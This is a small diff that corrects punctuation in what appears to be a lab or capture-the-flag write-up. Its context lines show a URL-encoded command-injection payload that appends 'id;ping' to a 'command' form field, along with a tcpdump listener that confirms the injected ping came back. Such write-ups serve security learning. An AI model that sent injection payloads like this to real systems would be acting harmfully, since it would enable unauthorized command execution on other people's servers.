@@ -73,7 +73,7 @@ Upgrade-Insecure-Requests: 1
 command=id%3bping%20-c%201%2010.8.153.120
 ```
 
-Bingo!, a reply!
+Bingo! A reply!
 ```
 ┌──(ac1d㉿kali)-[~]
 └─$ sudo tcpdump -i tun0 icmp                          
